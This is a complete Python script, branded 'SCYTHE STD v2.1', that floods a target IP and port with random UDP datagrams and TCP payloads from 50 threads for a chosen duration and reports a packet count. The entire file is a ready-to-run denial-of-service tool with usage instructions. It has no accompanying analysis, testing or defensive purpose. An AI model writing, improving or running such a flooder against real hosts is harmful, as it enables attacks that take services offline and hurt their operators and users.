# SCYTHE STD v2.1
import sys, socket, time, random, threading
if len(sys.argv) < 4: print('Usage: python3 std.py <ip> <port> <time> [threads]'); sys.exit(1)
ip, port, duration = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
print(f'[SCYTHE] STD: {ip}:{port} | {duration}s')
total = 0
lock = threading.Lock()
def flood():
  global total
  end = time.time() + duration
  while time.time() < end:
    try:
      udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      udp.sendto(random._urandom(1024), (ip, port)); udp.close()
      tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      tcp.settimeout(1)
      try: tcp.connect((ip, port)); tcp.send(random._urandom(512)); tcp.close()
      except: pass
      total += 2
    except: pass
for _ in range(50):
  threading.Thread(target=flood, daemon=True).start()
time.sleep(duration)
print(f'[STD] Completed: {total} packets')